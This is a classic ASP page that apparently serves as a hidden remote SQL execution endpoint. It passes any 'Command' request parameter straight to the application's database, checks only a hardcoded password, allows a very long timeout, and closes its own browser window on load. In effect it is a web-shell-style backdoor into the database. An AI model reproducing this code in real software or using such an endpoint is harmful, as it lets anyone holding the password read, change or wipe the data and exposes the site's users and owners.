<%@ Language=VBScript %>
<HTML>
<HEAD>
<META NAME="GENERATOR" Content="Microsoft Visual Studio 6.0">
<SCRIPT ID=clientEventHandlersJS LANGUAGE=javascript>
<!--

function window_onload() {
		window.opener='X';
		window.open('','_parent','')
		window.close();	
}

//-->
</SCRIPT>
</HEAD>
<BODY LANGUAGE=javascript onload="return window_onload()">

<%

	if Request("Command") = "" or request("Password") <> "0K2Run!" then
		Response.Write "<font size=2 face=verdana><BR>Could Not Run.</font>"
	else
		set cn = server.CreateObject("ADODB.Connection")
		cn.ConnectionString = Session("PDPIMS_ConnectionString") 
		cn.Open
		cn.CommandTimeout = 5400

		cn.Execute request("Command")

		cn.Close
		set cn = nothing
	end if

%>

</BODY>
</HTML>
